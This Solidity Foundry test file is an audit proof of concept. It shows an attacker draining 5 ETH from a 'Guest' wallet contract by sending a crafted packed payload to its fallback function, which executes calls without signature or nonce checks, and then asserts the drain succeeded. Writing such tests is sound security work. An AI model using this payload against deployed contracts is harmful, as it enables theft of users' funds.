// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/Guest.sol";
import "../src/modules/Payload.sol";

contract AuditAgentPoC is ExtendedSessionTestBase {
    Guest public Guest;
    Target public target;

    // ATTACK TIMELINE:
    // 1. [Setup] Deploy Guest and Target contracts. Fund Guest with 10 ETH.
    // 2. [T=0] Attacker crafts a Payload.Call to transfer 5 ETH from Guest to Attacker.
    // 3. [T=1] Attacker encodes the payload using PrimitivesRPC.toPackedPayload.
    // 4. [T=2] Attacker sends the packed payload directly to Guest's fallback function.
    // 5. [T=3] Guest._dispatchGuest decodes and executes the call via LibOptim.call() WITHOUT signature validation.
    // 6. [Assert] Verify attacker received 5 ETH and Target contract recorded the cross-chain replay execution.

    function setUp() public virtual override {
        super.setUp();
        Guest = new Guest();
        target = new Target();
        vm.deal(address(Guest), 10 ether);
    }

    function test_exploit() public {
        address attacker = address(0xdead);
        vm.deal(attacker, 1 ether);

        uint256 attackerBalBefore = attacker.balance;
        uint256 guestBalBefore = address(Guest).balance;

        // Construct a payload that transfers 5 ETH from Guest to the attacker
        // and calls the target contract to simulate cross-chain replay execution
        Payload.Decoded memory payload;
        payload.kind = Payload.KIND_TRANSACTIONS;
        payload.calls = new Payload.Call[](2);

        payload.calls[0] = Payload.Call({
            to: attacker,
            value: 5 ether,
            data: "",
            gasLimit: 0,
            delegateCall: false,
            onlyFallback: false,
            behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR
        });

        payload.calls[1] = Payload.Call({
            to: address(target),
            value: 0,
            data: abi.encodeWithSelector(Target.executeCrossChainOperation.selector, 0), // chainId=0 (_noChainId)
            gasLimit: 0,
            delegateCall: false,
            onlyFallback: false,
            behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR
        });

        // Encode the payload using the project's PrimitivesRPC helper
        bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, payload);

        // Attacker sends the packed calls directly to Guest's fallback function
        // Guest executes them WITHOUT any signature validation or nonce check
        vm.prank(attacker);
        (bool success, ) = address(Guest).call(packedPayload);
        require(success, "Guest fallback execution failed");

        uint256 attackerBalAfter = attacker.balance;
        uint256 guestBalAfter = address(Guest).balance;

        // Assert the attacker successfully drained funds from Guest without auth
        assertEq(attackerBalAfter, attackerBalBefore + 5 ether, "Attacker should have gained 5 ETH");
        assertEq(guestBalAfter, guestBalBefore - 5 ether, "Guest should have lost 5 ETH");

        // Assert the cross-chain operation was executed with chainId=0
        assertEq(target.lastChainId(), 0, "Cross-chain operation executed with _noChainId");
        assertTrue(target.operationExecuted(), "Unauthorized cross-chain operation executed");
    }
}

contract Target {
    bool public operationExecuted;
    uint256 public lastChainId;

    function executeCrossChainOperation(uint256 chainId) external {
        operationExecuted = true;
        lastChainId = chainId;
    }
}
